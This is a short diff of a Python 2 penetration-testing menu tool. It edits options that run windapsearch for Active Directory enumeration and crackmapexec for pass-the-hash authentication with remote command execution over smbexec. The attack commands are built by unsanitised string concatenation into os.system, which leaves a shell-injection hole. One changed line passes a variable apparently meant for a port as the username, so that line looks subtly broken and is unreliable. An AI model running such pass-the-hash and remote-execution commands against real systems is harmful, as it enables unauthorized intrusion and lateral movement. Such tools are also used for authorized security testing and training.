@@ -79,7 +79,7 @@ def gettime(value):
    return variable
 
 def command(command):
-#   print colored("Using Command: " + command + "\n", 'white')	# COMMENT OUT TO STOP DEBUGGING COMMANDS
+   print colored("Using Command: " + command + "\n", 'white')	# COMMENT OUT TO STOP DEBUGGING COMMANDS
    os.system(command)
    raw_input("\nPress ENTER to continue...")
    return
@@ -1208,7 +1208,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='48':
-      command(PRO + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + HST.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -GUC --da --full")
+      command(PRO + "windapsearch.py -d " + HST.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -GUC --da --full")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -1254,7 +1254,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='52':
-      command("crackmapexec smb " + TIP.rstrip(" ") + " -u Administrator -H 000:" + PA[0] + " -x 'net user Administrator /domain' --exec-method smbexec")
+      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + POR.strip(" ") + " -H " + PA[0] + " -x 'net user Administrator /domain' --exec-method smbexec")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
